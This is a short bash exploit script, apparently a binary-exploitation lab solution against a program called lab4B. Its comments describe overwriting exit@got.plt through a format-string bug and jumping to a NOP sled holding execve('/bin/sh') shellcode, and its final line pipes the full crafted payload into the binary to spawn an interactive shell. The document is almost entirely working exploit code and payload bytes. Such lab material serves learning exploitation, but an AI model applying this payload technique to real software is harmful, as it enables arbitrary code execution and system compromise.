#!/bin/bash

# Here used two observations:
#	- exit@got.plt is at 080499b8 -> to be overwritten with (0xbffff588+0x24) address (at NOP sled)
# 	- there is a "/bin/sh" string within libc located at: 0xb7f83a24
#		gdb-peda$ find "/bin/sh"
#		Searching for '/bin/sh' in: None ranges
#		Found 1 results, display max 1 items:
#		libc : 0xb7f83a24 ("/bin/sh")
#	Therefore shellcode could be as simple as:
#		   f:    90                       nop * 16
#		  10:    31 c9                    xor    ecx, ecx
#		  12:    f7 e1                    mul    ecx
#		  14:    b0 0b                    mov    al, 0xb
#		  16:    bb 24 3a f8 b7           mov    ebx, 0xb7f83a24
#		  1b:    cd 80                    int    0x80
#
# Whereas GOT overwriting could be achieved using my ./format_string_vuln_gen.py
#

(echo $'\xb8\x99\x04\x08\xba\x99\x04\x08%62884x%6$hn%51795x%7$hn\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc9\xf7\xe1\xb0\x0b\xbb\x24\x3a\xf8\xb7\xcd\x80' ; cat ) | ./lab4B
